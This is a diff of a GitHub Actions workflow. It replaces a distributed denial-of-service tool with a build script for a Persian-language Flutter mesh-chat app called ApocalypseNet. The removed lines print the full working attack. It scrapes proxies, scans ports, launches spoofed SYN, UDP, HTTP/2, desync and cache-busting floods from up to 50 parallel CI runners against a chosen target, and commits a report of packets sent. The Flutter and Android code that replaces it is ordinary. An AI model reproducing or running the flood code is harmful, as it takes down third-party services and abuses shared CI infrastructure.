@@ -1,345 +1,534 @@
-name: DDoS God Shard – 20‑Army Assault
+name: Build ApocalypseNet APK
 
 on:
   workflow_dispatch:
-    inputs:
-      target:
-        description: 'Target URL or IP'
-        required: true
-      port:
-        description: 'Port (auto = scan)'
-        required: true
-        default: 'auto'
-      duration:
-        description: 'Duration (seconds)'
-        required: true
-        default: '120'
-      threads_per_vector:
-        description: 'Threads per attack vector (per shard)'
-        required: true
-        default: '400'
-      shard_count:
-        description: 'Number of parallel shards (1‑50)'
-        required: true
-        default: '20'
-      dns_server:
-        description: 'Custom DNS (optional)'
-        required: false
-        default: ''
-      proxy_sources:
-        description: 'Proxy URLs (auto for defaults)'
-        required: false
-        default: 'auto'
-
-permissions:
-  contents: write
 
 jobs:
-  prepare:
+  build:
     runs-on: ubuntu-latest
-    outputs:
-      shard_indices: ${{ steps.build.outputs.indices }}
     steps:
       - uses: actions/checkout@v4
 
-      - name: Build assault script + indices
-        id: build
-        env:
-          SHARD_COUNT: ${{ github.event.inputs.shard_count }}
+      - name: نصب Flutter
+        uses: subosito/flutter-action@v2
+        with:
+          channel: stable
+
+      - name: ایجاد ساختار پروژه
         run: |
-          cat > assault.py << 'ASSAULT_EOF'
-          import os, sys, json, time, random, socket, threading, asyncio, aiohttp, concurrent.futures, gc, psutil, requests, dns.resolver
-          from datetime import datetime
-          from pathlib import Path
+          flutter create --platforms android .
+          # پاک کردن محتوای پیش‌فرض lib/main.dart
+          rm -f lib/main.dart
 
-          SHARD_ID = int(os.environ['SHARD_ID'])
-          TARGET = os.environ['TARGET']
-          PORT_ARG = os.environ['PORT']
-          DURATION = int(os.environ['DURATION'])
-          THREADS_PER_VECTOR = int(os.environ.get('THREADS_PER_VECTOR', 400))
-          DNS_SERVER = os.environ.get('DNS_SERVER', '').strip()
-          PROXY_SOURCES_INPUT = os.environ.get('PROXY_SOURCES', 'auto').strip()
+      - name: نوشتن فایل‌های Dart و تنظیمات
+        run: |
+          # ----- pubspec.yaml -----
+          cat > pubspec.yaml << 'EOF'
+          name: apocalypse_net
+          description: "اینترنت آخرالزمان"
+          publish_to: 'none'
+          version: 1.0.0+1
 
-          stop_event = threading.Event()
-          stats_lock = threading.Lock()
-          stats = {v: {'sent':0,'ok':0} for v in ['syn','udp','http','http2','desync','cache']}
+          environment:
+            sdk: '>=3.2.0 <4.0.0'
 
-          def inc(v, k, n=1):
-              with stats_lock: stats[v][k] += n
+          dependencies:
+            flutter:
+              sdk: flutter
+            wifi_direct: ^0.2.0
+            google_fonts: ^6.1.0
+            animated_text_kit: ^4.2.2
 
-          # ===== DNS =====
-          CUSTOM_RESOLVER = None
-          if DNS_SERVER:
-              try:
-                  resolver = dns.resolver.Resolver()
-                  resolver.nameservers = [DNS_SERVER]
-                  CUSTOM_RESOLVER = resolver
-              except: pass
+          dev_dependencies:
+            flutter_test:
+              sdk: flutter
 
-          def resolve_target(t):
-              for p in ['https://','http://']:
-                  if t.startswith(p): t = t[len(p):]
-              t = t.split('/')[0].split(':')[0]
-              if CUSTOM_RESOLVER:
-                  try: return CUSTOM_RESOLVER.resolve(t, 'A')[0].address
-                  except: pass
-              return socket.gethostbyname(t)
+          flutter:
+            uses-material-design: true
+          EOF
 
-          # ===== پروکسی‌ها =====
-          PROXY_LIST = []
-          PROXY_SOURCES = [
-              "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-              "https://raw.githubusercontent.com/GoekhanDev/free-proxy-list/main/proxies/http.txt",
-              "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000"
-          ]
-          if PROXY_SOURCES_INPUT != 'auto':
-              PROXY_SOURCES = [u.strip() for u in PROXY_SOURCES_INPUT.split(',') if u.strip()]
+          # ----- lib/theme.dart -----
+          mkdir -p lib
+          cat > lib/theme.dart << 'DARTEOF'
+          import 'package:flutter/material.dart';
+          import 'package:google_fonts/google_fonts.dart';
 
-          async def check_proxy(p):
-              try:
-                  async with aiohttp.ClientSession() as s:
-                      async with s.get("http://httpbin.org/ip", proxy=f"http://{p}", timeout=3) as r:
-                          return p if r.status == 200 else None
-              except: return None
+          class ApocalypseTheme {
+            static const Color background = Color(0xFF0A0E14);
+            static const Color neonGreen = Color(0xFF39FF14);
+            static const Color neonBlue = Color(0xFF00F0FF);
+            static const Color neonPurple = Color(0xFFBF5AF2);
+            static const Color darkSurface = Color(0xFF1A1E24);
+            static const Color textPrimary = Color(0xFFE0E0E0);
+            static const Color textSecondary = Color(0xFF9E9E9E);
 
-          async def refresh_proxies():
-              global PROXY_LIST
-              raw = set()
-              for url in PROXY_SOURCES:
-                  try:
-                      resp = requests.get(url, timeout=10)
-                      for line in resp.text.splitlines():
-                          line = line.strip()
-                          if line and not line.startswith("#"):
-                              raw.add(line)
-                  except: pass
-              tasks = [check_proxy(p) for p in raw]
-              results = await asyncio.gather(*tasks)
-              PROXY_LIST = [p for p in results if p]
-              print(f"[Shard {SHARD_ID}] {len(PROXY_LIST)} live proxies")
-
-          asyncio.run(refresh_proxies())
-
-          # ===== اسکن پورت (در صورت auto) =====
-          ip = resolve_target(TARGET)
-          if not ip:
-              print("❌ Could not resolve target")
-              sys.exit(1)
-
-          if PORT_ARG == 'auto':
-              ports = []
-              def check_port(ip, port):
-                  try:
-                      s = socket.socket(); s.settimeout(0.2)
-                      r = s.connect_ex((ip, port)); s.close()
-                      return port if r == 0 else None
-                  except: return None
-              with concurrent.futures.ThreadPoolExecutor(max_workers=200) as ex:
-                  futures = {ex.submit(check_port, ip, p): p for p in [80,443,8080,8443,3000,8000,5000,4000]}
-                  for f in concurrent.futures.as_completed(futures):
-                      p = f.result()
-                      if p: ports.append(p)
-              if not ports: ports = [80]
-          else:
-              ports = [int(PORT_ARG)]
-
-          # ===== کارگرهای حمله =====
-          def udp_worker(ip, port):
-              s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-              while not stop_event.is_set():
-                  try:
-                      s.sendto(random._urandom(random.randint(1024,4096)), (ip, port))
-                      inc('udp','sent'); inc('udp','ok')
-                  except: inc('udp','sent')
-
-          def syn_worker(ip, port):
-              from scapy.all import IP, TCP, send
-              while not stop_event.is_set():
-                  src = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
-                  pkt = IP(src=src, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="S")
-                  send(pkt, verbose=False)
-                  inc('syn','sent'); inc('syn','ok')
-
-          async def http_worker(url):
-              conn = aiohttp.TCPConnector(limit=0)
-              async with aiohttp.ClientSession(connector=conn) as s:
-                  while not stop_event.is_set():
-                      hdr = {"User-Agent": random.choice([
-                          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
-                          "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
-                      ])}
-                      proxy = f"http://{random.choice(PROXY_LIST)}" if PROXY_LIST else None
-                      try:
-                          async with s.get(url, headers=hdr, timeout=4, proxy=proxy) as r:
-                              inc('http','sent'); inc('http','ok') if r.status<500 else None
-                      except: inc('http','sent')
-
-          async def http2_worker(url):
-              import httpx
-              async with httpx.AsyncClient(http2=True, verify=False, timeout=4) as c:
-                  while not stop_event.is_set():
-                      try:
-                          r = await c.get(url)
-                          inc('http2','sent'); inc('http2','ok') if r.status_code<500 else None
-                      except: inc('http2','sent')
-
-          async def desync_worker(url):
-              host = url.replace('https://','').replace('http://','').split('/')[0]
-              port = 443 if 'https' in url else 80
-              while not stop_event.is_set():
-                  try:
-                      s = socket.socket(); s.settimeout(3); s.connect((host,port))
-                      s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n".encode())
-                      s.close()
-                      inc('desync','sent'); inc('desync','ok')
-                  except: inc('desync','sent')
-
-          async def cache_worker(url):
-              conn = aiohttp.TCPConnector(limit=0)
-              async with aiohttp.ClientSession(connector=conn) as s:
-                  while not stop_event.is_set():
-                      hdr = {"User-Agent": random.choice(["Mozilla/5.0...","Chrome/120..."]),
-                             "Cache-Control": "no-cache, no-store"}
-                      proxy = f"http://{random.choice(PROXY_LIST)}" if PROXY_LIST else None
-                      params = {f"cb_{random.randint(0,9999)}": random.randint(100000, 999999)}
-                      try:
-                          async with s.get(url, headers=hdr, params=params, timeout=4, proxy=proxy) as r:
-                              inc('cache','sent'); inc('cache','ok') if r.status<500 else None
-                      except: inc('cache','sent')
-
-          def run_async(func, url, n):
-              loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
-              tasks = [func(url) for _ in range(n)]
-              loop.run_until_complete(asyncio.gather(*tasks))
-
-          # ===== نگهبان حافظه =====
-          class MemGuard(threading.Thread):
-              def __init__(self, limit_mb=6500):
-                  super().__init__(daemon=True); self.limit = limit_mb
-              def run(self):
-                  while not stop_event.is_set():
-                      if psutil.Process().memory_info().rss/1024**2 > self.limit:
-                          gc.collect()
-                      time.sleep(2)
-          MemGuard().start()
-
-          # ===== شلیک =====
-          for port in ports:
-              base = f"{'https' if port==443 else 'http'}://{TARGET}" if port in (80,443) else f"http://{TARGET}:{port}"
-              print(f"[Shard {SHARD_ID}] Firing on {ip}:{port}")
-              for _ in range(THREADS_PER_VECTOR):
-                  threading.Thread(target=udp_worker, args=(ip, port), daemon=True).start()
-                  threading.Thread(target=syn_worker, args=(ip, port), daemon=True).start()
-                  threading.Thread(target=run_async, args=(http_worker, base, 1), daemon=True).start()
-                  threading.Thread(target=run_async, args=(http2_worker, base, 1), daemon=True).start()
-                  threading.Thread(target=run_async, args=(desync_worker, base, 1), daemon=True).start()
-                  threading.Thread(target=run_async, args=(cache_worker, base, 1), daemon=True).start()
-
-          time.sleep(DURATION)
-          stop_event.set()
-          time.sleep(1)
-
-          # ===== خروجی JSON =====
-          result = {
-              "shard": SHARD_ID,
-              "target": TARGET,
-              "ip": ip,
-              "ports": ports,
-              "duration": DURATION,
-              "stats": {v: dict(s) for v, s in stats.items()}
+            static ThemeData get darkTheme => ThemeData(
+                  brightness: Brightness.dark,
+                  scaffoldBackgroundColor: background,
+                  primaryColor: neonGreen,
+                  appBarTheme: AppBarTheme(
+                    backgroundColor: darkSurface,
+                    titleTextStyle: GoogleFonts.orbitron(
+                      fontSize: 20, fontWeight: FontWeight.bold, color: neonGreen),
+                    iconTheme: const IconThemeData(color: neonGreen),
+                  ),
+                  textTheme: TextTheme(
+                    bodyLarge: GoogleFonts.robotoMono(color: textPrimary),
+                    bodyMedium: GoogleFonts.robotoMono(color: textSecondary),
+                  ),
+                  elevatedButtonTheme: ElevatedButtonThemeData(
+                    style: ElevatedButton.styleFrom(
+                      backgroundColor: neonGreen,
+                      foregroundColor: background,
+                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
+                    ),
+                  ),
+                );
           }
-          with open(f"shard_{SHARD_ID}_result.json", "w") as f:
-              json.dump(result, f)
-          print(f"[Shard {SHARD_ID}] Done.")
-          ASSAULT_EOF
+          DARTEOF
 
-          python3 -c "import json; json.dump(list(range($SHARD_COUNT)), open('indices.json','w'))"
-          echo "indices=$(cat indices.json)" >> $GITHUB_OUTPUT
+          # ----- lib/mesh/mesh_manager.dart -----
+          mkdir -p lib/mesh
+          cat > lib/mesh/mesh_manager.dart << 'DARTEOF'
+          import 'dart:async';
+          import 'package:wifi_direct/wifi_direct.dart';
 
-      - name: Upload assault package
+          class MeshManager {
+            final List<Map<String, dynamic>> peers = [];
+            final List<String> messages = [];
+            Function? onPeersChanged;
+            Function? onMessageReceived;
+            StreamSubscription? _peerSub;
+
+            Future<void> init({required String userName}) async {
+              _peerSub = WifiDirect.onPeersChanged.listen((list) {
+                peers.clear();
+                for (var p in list) {
+                  peers.add({
+                    'name': p.deviceName,
+                    'address': p.address,
+                    'status': p.status.toString(),
+                  });
+                }
+                onPeersChanged?.call();
+              });
+              await WifiDirect.startDiscovery();
+            }
+
+            Future<void> sendText(String text) async {
+              messages.add('من: $text');
+              onMessageReceived?.call();
+            }
+
+            void dispose() {
+              _peerSub?.cancel();
+              WifiDirect.stopDiscovery();
+            }
+          }
+          DARTEOF
+
+          # ----- lib/widgets/radar_painter.dart -----
+          mkdir -p lib/widgets
+          cat > lib/widgets/radar_painter.dart << 'DARTEOF'
+          import 'dart:math';
+          import 'package:flutter/material.dart';
+          import 'package:apocalypse_net/theme.dart';
+
+          class RadarPainter extends CustomPainter {
+            final List<Offset> nodePositions;
+            final double animationValue;
+
+            RadarPainter({required this.nodePositions, required this.animationValue});
+
+            @override
+            void paint(Canvas canvas, Size size) {
+              final center = Offset(size.width / 2, size.height / 2);
+              final radius = min(size.width, size.height) / 2 - 10;
+
+              for (int i = 1; i <= 4; i++) {
+                final paint = Paint()
+                  ..color = ApocalypseTheme.neonGreen.withOpacity(0.1 * i)
+                  ..style = PaintingStyle.stroke
+                  ..strokeWidth = 1.5;
+                canvas.drawCircle(center, radius * i / 4, paint);
+              }
+
+              final scanPaint = Paint()
+                ..shader = SweepGradient(
+                  colors: [
+                    ApocalypseTheme.neonGreen.withOpacity(0),
+                    ApocalypseTheme.neonGreen.withOpacity(0.8),
+                    ApocalypseTheme.neonGreen.withOpacity(0),
+                  ],
+                  stops: const [0.0, 0.3, 1.0],
+                ).createShader(Rect.fromCircle(center: center, radius: radius))
+                ..style = PaintingStyle.fill;
+              canvas.save();
+              canvas.rotate(animationValue * 2 * pi);
+              canvas.drawArc(
+                Rect.fromCircle(center: center, radius: radius),
+                -pi / 4, pi / 2, true, scanPaint);
+              canvas.restore();
+
+              for (final pos in nodePositions) {
+                final nodeOffset = Offset(
+                  center.dx + pos.dx * radius - radius / 2,
+                  center.dy + pos.dy * radius - radius / 2,
+                );
+                final glowPaint = Paint()
+                  ..color = ApocalypseTheme.neonBlue.withOpacity(0.4)
+                  ..maskFilter = const MaskFilter.blur(BlurStyle.normal, 8);
+                canvas.drawCircle(nodeOffset, 8, glowPaint);
+                final nodePaint = Paint()..color = ApocalypseTheme.neonBlue;
+                canvas.drawCircle(nodeOffset, 5, nodePaint);
+                final textPainter = TextPainter(
+                  text: TextSpan(text: 'Node', style: TextStyle(color: ApocalypseTheme.neonBlue, fontSize: 8)),
+                  textDirection: TextDirection.ltr,
+                )..layout();
+                textPainter.paint(canvas, Offset(nodeOffset.dx - 10, nodeOffset.dy - 15));
+              }
+
+              canvas.drawCircle(center, 10, Paint()..color = ApocalypseTheme.neonGreen);
+            }
+
+            @override
+            bool shouldRepaint(covariant RadarPainter oldDelegate) => true;
+          }
+          DARTEOF
+
+          # ----- lib/screens/home_screen.dart -----
+          mkdir -p lib/screens
+          cat > lib/screens/home_screen.dart << 'DARTEOF'
+          import 'dart:math';
+          import 'package:flutter/material.dart';
+          import 'package:apocalypse_net/mesh/mesh_manager.dart';
+          import 'package:apocalypse_net/widgets/radar_painter.dart';
+          import 'package:apocalypse_net/theme.dart';
+          import 'package:apocalypse_net/screens/chat_screen.dart';
+
+          class HomeScreen extends StatefulWidget {
+            final MeshManager meshManager;
+            const HomeScreen({super.key, required this.meshManager});
+
+            @override
+            State<HomeScreen> createState() => _HomeScreenState();
+          }
+
+          class _HomeScreenState extends State<HomeScreen> with SingleTickerProviderStateMixin {
+            late AnimationController _radarAnim;
+            final Random _random = Random();
+
+            @override
+            void initState() {
+              super.initState();
+              _radarAnim = AnimationController(vsync: this, duration: const Duration(seconds: 3))..repeat();
+              widget.meshManager.onPeersChanged = () => setState(() {});
+            }
+
+            @override
+            void dispose() {
+              _radarAnim.dispose();
+              super.dispose();
+            }
+
+            List<Offset> get _simulatedPositions {
+              return List.generate(
+                widget.meshManager.peers.length,
+                (i) => Offset(_random.nextDouble() * 2 - 1, _random.nextDouble() * 2 - 1),
+              );
+            }
+
+            @override
+            Widget build(BuildContext context) {
+              return Scaffold(
+                appBar: AppBar(
+                  title: const Text('آخرالزمان'),
+                  actions: [
+                    IconButton(
+                      icon: const Icon(Icons.chat_bubble),
+                      onPressed: () {
+                        Navigator.push(context, MaterialPageRoute(builder: (_) => ChatScreen(meshManager: widget.meshManager)));
+                      },
+                    ),
+                  ],
+                ),
+                body: Column(
+                  children: [
+                    Expanded(
+                      flex: 2,
+                      child: AnimatedBuilder(
+                        animation: _radarAnim,
+                        builder: (_, __) => CustomPaint(
+                          size: Size.infinite,
+                          painter: RadarPainter(
+                            nodePositions: _simulatedPositions,
+                            animationValue: _radarAnim.value,
+                          ),
+                        ),
+                      ),
+                    ),
+                    Expanded(
+                      flex: 1,
+                      child: Container(
+                        color: ApocalypseTheme.darkSurface,
+                        child: Column(
+                          crossAxisAlignment: CrossAxisAlignment.start,
+                          children: [
+                            Padding(
+                              padding: const EdgeInsets.all(8.0),
+                              child: Text('گره‌های فعال: ${widget.meshManager.peers.length}',
+                                  style: const TextStyle(color: ApocalypseTheme.neonGreen, fontWeight: FontWeight.bold)),
+                            ),
+                            Expanded(
+                              child: ListView.builder(
+                                itemCount: widget.meshManager.peers.length,
+                                itemBuilder: (ctx, i) {
+                                  final node = widget.meshManager.peers[i];
+                                  return ListTile(
+                                    leading: Icon(Icons.phone_android, color: ApocalypseTheme.neonGreen),
+                                    title: Text(node['name'] ?? 'Unknown', style: TextStyle(color: ApocalypseTheme.textPrimary)),
+                                    subtitle: Text('سیگنال: ${_random.nextInt(80) + 20}%', style: TextStyle(color: ApocalypseTheme.textSecondary)),
+                                    trailing: Icon(Icons.wifi_tethering, color: ApocalypseTheme.neonBlue),
+                                  );
+                                },
+                              ),
+                            ),
+                          ],
+                        ),
+                      ),
+                    ),
+                  ],
+                ),
+              );
+            }
+          }
+          DARTEOF
+
+          # ----- lib/screens/chat_screen.dart -----
+          cat > lib/screens/chat_screen.dart << 'DARTEOF'
+          import 'package:flutter/material.dart';
+          import 'package:apocalypse_net/mesh/mesh_manager.dart';
+          import 'package:apocalypse_net/theme.dart';
+
+          class ChatScreen extends StatefulWidget {
+            final MeshManager meshManager;
+            const ChatScreen({super.key, required this.meshManager});
+
+            @override
+            State<ChatScreen> createState() => _ChatScreenState();
+          }
+
+          class _ChatScreenState extends State<ChatScreen> {
+            final TextEditingController _controller = TextEditingController();
+
+            @override
+            void initState() {
+              super.initState();
+              widget.meshManager.onMessageReceived = () => setState(() {});
+            }
+
+            void _send() {
+              if (_controller.text.isNotEmpty) {
+                widget.meshManager.sendText(_controller.text);
+                _controller.clear();
+                setState(() {});
+              }
+            }
+
+            @override
+            Widget build(BuildContext context) {
+              return Scaffold(
+                appBar: AppBar(title: const Text('کانال مشترک')),
+                body: Column(
+                  children: [
+                    Expanded(
+                      child: ListView.builder(
+                        itemCount: widget.meshManager.messages.length,
+                        itemBuilder: (ctx, i) {
+                          final msg = widget.meshManager.messages[i];
+                          final isMine = msg.startsWith('من:');
+                          return Align(
+                            alignment: isMine ? Alignment.centerRight : Alignment.centerLeft,
+                            child: Container(
+                              margin: const EdgeInsets.all(4),
+                              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
+                              decoration: BoxDecoration(
+                                color: isMine ? ApocalypseTheme.neonGreen.withOpacity(0.2) : ApocalypseTheme.neonBlue.withOpacity(0.2),
+                                borderRadius: BorderRadius.circular(12),
+                              ),
+                              child: Text(msg, style: TextStyle(color: isMine ? ApocalypseTheme.neonGreen : ApocalypseTheme.neonBlue)),
+                            ),
+                          );
+                        },
+                      ),
+                    ),
+                    SafeArea(
+                      child: Padding(
+                        padding: const EdgeInsets.all(8.0),
+                        child: Row(
+                          children: [
+                            Expanded(
+                              child: TextField(
+                                controller: _controller,
+                                decoration: const InputDecoration(hintText: 'پیام...', border: OutlineInputBorder()),
+                                style: const TextStyle(color: ApocalypseTheme.textPrimary),
+                              ),
+                            ),
+                            IconButton(icon: Icon(Icons.send, color: ApocalypseTheme.neonGreen), onPressed: _send),
+                          ],
+                        ),
+                      ),
+                    ),
+                  ],
+                ),
+              );
+            }
+          }
+          DARTEOF
+
+          # ----- lib/main.dart -----
+          cat > lib/main.dart << 'DARTEOF'
+          import 'package:flutter/material.dart';
+          import 'package:apocalypse_net/mesh/mesh_manager.dart';
+          import 'package:apocalypse_net/screens/home_screen.dart';
+          import 'package:apocalypse_net/theme.dart';
+
+          void main() => runApp(const ApocalypseNetApp());
+
+          class ApocalypseNetApp extends StatelessWidget {
+            const ApocalypseNetApp({super.key});
+            @override
+            Widget build(BuildContext context) {
+              return MaterialApp(
+                title: 'اینترنت آخرالزمان',
+                debugShowCheckedModeBanner: false,
+                theme: ApocalypseTheme.darkTheme,
+                home: const SplashInit(),
+              );
+            }
+          }
+
+          class SplashInit extends StatefulWidget {
+            const SplashInit({super.key});
+            @override
+            State<SplashInit> createState() => _SplashInitState();
+          }
+
+          class _SplashInitState extends State<SplashInit> {
+            final MeshManager _meshManager = MeshManager();
+            bool _initialized = false;
+
+            @override
+            void initState() {
+              super.initState();
+              _initMesh();
+            }
+
+            Future<void> _initMesh() async {
+              await _meshManager.init(userName: 'کاوشگر');
+              setState(() => _initialized = true);
+            }
+
+            @override
+            Widget build(BuildContext context) {
+              if (!_initialized) {
+                return const Scaffold(body: Center(child: CircularProgressIndicator(color: ApocalypseTheme.neonGreen)));
+              }
+              return HomeScreen(meshManager: _meshManager);
+            }
+          }
+          DARTEOF
+
+          # ----- Android Manifest (مجوزها) -----
+          cat > android/app/src/main/AndroidManifest.xml << 'XMLEOF'
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              package="com.apocalypse.apocalypse_net">
+              <uses-permission android:name="android.permission.INTERNET"/>
+              <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+              <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+              <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+              <uses-permission android:name="android.permission.BLUETOOTH"/>
+              <uses-permission android:name="android.permission.BLUETOOTH_ADMIN"/>
+              <uses-permission android:name="android.permission.BLUETOOTH_SCAN" android:usesPermissionFlags="neverForLocation"/>
+              <uses-permission android:name="android.permission.BLUETOOTH_ADVERTISE"/>
+              <uses-permission android:name="android.permission.BLUETOOTH_CONNECT"/>
+              <uses-permission android:name="android.permission.NEARBY_WIFI_DEVICES" android:usesPermissionFlags="neverForLocation"/>
+              <application
+                  android:label="اینترنت آخرالزمان"
+                  android:name="${applicationName}"
+                  android:icon="@mipmap/ic_launcher"
+                  android:usesCleartextTraffic="true">
+                  <activity
+                      android:name=".MainActivity"
+                      android:exported="true"
+                      android:launchMode="singleTop"
+                      android:theme="@style/LaunchTheme"
+                      android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
+                      android:hardwareAccelerated="true"
+                      android:windowSoftInputMode="adjustResize">
+                      <meta-data android:name="io.flutter.embedding.android.NormalTheme" android:resource="@style/NormalTheme"/>
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN"/>
+                          <category android:name="android.intent.category.LAUNCHER"/>
+                      </intent-filter>
+                  </activity>
+                  <meta-data android:name="flutterEmbedding" android:value="2"/>
+              </application>
+          </manifest>
+          XMLEOF
+
+          # ----- android/app/build.gradle.kts (minSdk 21) -----
+          cat > android/app/build.gradle.kts << 'GRADLEEOF'
+          plugins {
+              id("com.android.application")
+              id("org.jetbrains.kotlin.android")
+              id("dev.flutter.flutter-gradle-plugin")
+          }
+
+          android {
+              namespace = "com.apocalypse.apocalypse_net"
+              compileSdk = 34
+
+              compileOptions {
+                  sourceCompatibility = JavaVersion.VERSION_1_8
+                  targetCompatibility = JavaVersion.VERSION_1_8
+              }
+
+              kotlinOptions {
+                  jvmTarget = "1.8"
+              }
+
+              defaultConfig {
+                  applicationId = "com.apocalypse.apocalypse_net"
+                  minSdk = 21
+                  targetSdk = 34
+                  versionCode = 1
+                  versionName = "1.0"
+              }
+
+              buildTypes {
+                  release {
+                      signingConfig = signingConfigs.debug
+                  }
+              }
+          }
+
+          flutter {
+              source = "../.."
+          }
+          GRADLEEOF
+
+      - name: دریافت وابستگی‌ها
+        run: flutter pub get
+
+      - name: ساخت APK
+        run: flutter build apk --debug --split-per-abi
+
+      - name: آپلود APK
         uses: actions/upload-artifact@v4
         with:
-          name: assault-package
-          path: |
-            assault.py
-            indices.json
-
-  shard:
-    name: "Shard ${{ matrix.shard }}"
-    needs: prepare
-    runs-on: ubuntu-latest
-    continue-on-error: true
-    strategy:
-      fail-fast: false
-      matrix:
-        shard: ${{ fromJson(needs.prepare.outputs.shard_indices) }}
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: Download assault package
-        uses: actions/download-artifact@v4
-        with:
-          name: assault-package
-
-      - name: Install dependencies
-        run: pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap requests dnspython psutil
-
-      - name: Execute assault
-        env:
-          SHARD_ID: ${{ matrix.shard }}
-          TARGET: ${{ github.event.inputs.target }}
-          PORT: ${{ github.event.inputs.port }}
-          DURATION: ${{ github.event.inputs.duration }}
-          THREADS_PER_VECTOR: ${{ github.event.inputs.threads_per_vector }}
-          DNS_SERVER: ${{ github.event.inputs.dns_server }}
-          PROXY_SOURCES: ${{ github.event.inputs.proxy_sources }}
-        run: python3 assault.py
-
-      - name: Upload result
-        uses: actions/upload-artifact@v4
-        with:
-          name: shard-${{ matrix.shard }}-result
-          path: shard_${{ matrix.shard }}_result.json
-
-  merge:
-    needs: shard
-    runs-on: ubuntu-latest
-    if: always()
-    steps:
-      - uses: actions/checkout@v4
-
-      - name: Download all results
-        uses: actions/download-artifact@v4
-        with:
-          pattern: shard-*-result
-          path: results
-
-      - name: Merge and report
-        run: |
-          python3 -c "
-          import json, glob, os
-          total = {v:{'sent':0,'ok':0} for v in ['syn','udp','http','http2','desync','cache']}
-          for f in glob.glob('results/*/shard_*_result.json'):
-              with open(f) as fh:
-                  data = json.load(fh)
-              for vec, s in data['stats'].items():
-                  total[vec]['sent'] += s['sent']
-                  total[vec]['ok'] += s['ok']
-          with open('god_shard_report.txt', 'w') as rpt:
-              rpt.write('DDoS God Shard Report\n')
-              rpt.write(f'Total Shards: {len(glob.glob(\"results/*/shard_*_result.json\"))}\n')
-              rpt.write('Vector        | Sent       | OK\n')
-              rpt.write('-'*40 + '\n')
-              for vec in total:
-                  rpt.write(f'{vec:12} | {total[vec][\"sent\"]:>10,} | {total[vec][\"ok\"]:>10,}\n')
-              all_sent = sum(v['sent'] for v in total.values())
-              all_ok = sum(v['ok'] for v in total.values())
-              rpt.write(f'\nTotal packets: {all_sent:,}\n')
-              rpt.write(f'Total OK: {all_ok:,}\n')
-          print('Report saved.')
-          "
-          cat god_shard_report.txt
-          git add god_shard_report.txt
-          git commit -m "God Shard assault complete" || true
-          git push || true
+          name: apocalypse-net
+          path: build/app/outputs/flutter-apk/*.apk
